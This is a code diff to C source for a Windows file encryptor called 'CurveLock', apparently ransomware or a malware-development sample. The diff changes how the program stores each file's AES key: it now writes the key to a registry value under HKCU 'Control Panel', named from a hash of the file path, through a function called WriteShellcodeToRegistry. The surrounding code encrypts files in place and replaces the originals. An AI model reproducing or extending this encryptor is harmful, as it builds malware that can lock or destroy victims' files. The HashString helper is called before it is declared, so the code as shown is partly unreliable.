@@ -3,8 +3,10 @@
 #include <time.h>
 #include <Windows.h>
 #include <bcrypt.h>
+#include <shlwapi.h>
 
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "shlwapi.lib")
 #pragma warning(disable : 4996)
 
 #define ENCRYPTED_FILE_EXTENSION    L".CurveLock"
@@ -18,7 +20,6 @@
 
 // Registry key to read / write
 #define REGISTRY            "Control Panel"
-#define REGSTRING           "CurveLock"
 
 typedef struct _ENCRYPTED_FILE_HEADER {
     BYTE    Signature[0x04];
@@ -83,12 +84,12 @@ Point pointMultiply(Point P, int n) {
     return R;
 }
 
-BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {
+BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize, IN LPCSTR lpSubKey) {
     BOOL        bSTATE = TRUE;
     LSTATUS     STATUS = NULL;
     HKEY        hKey = NULL;
 
-    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);
+    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, lpSubKey);
 
     STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
     if (ERROR_SUCCESS != STATUS) {
@@ -96,7 +97,7 @@ BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {
         bSTATE = FALSE; goto _EndOfFunction;
     }
 
-    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
+    STATUS = RegSetValueExA(hKey, lpSubKey, 0, REG_BINARY, pShellcode, dwShellcodeSize);
     if (ERROR_SUCCESS != STATUS) {
         printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
         bSTATE = FALSE; goto _EndOfFunction;
@@ -311,8 +312,12 @@ BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
 
     BCryptCloseAlgorithmProvider(hAlg, 0);
 
+    // Generate a unique registry key name based on the file path
+    char regKeyName[MAX_PATH];
+    _snprintf_s(regKeyName, sizeof(regKeyName), _TRUNCATE, "CurveLock_%08X", HashString(szFilePathToEncrypt));
+
     // Save the generated AES key to the registry
-    if (!WriteShellcodeToRegistry(pbKey, AES_KEY_SIZE)) {
+    if (!WriteShellcodeToRegistry(pbKey, AES_KEY_SIZE, regKeyName)) {
         goto _END_OF_FUNC;
     }
 
@@ -398,6 +403,14 @@ _END_OF_FUNC:
     if (hFind != INVALID_HANDLE_VALUE)
         FindClose(hFind);
     return bResult;
+}
+
+int HashString(LPCWSTR str) {
+    int hash = 0;
+    while (*str) {
+        hash = (hash * 31) + *str++;
+    }
+    return hash;
 }
 
 int main() {
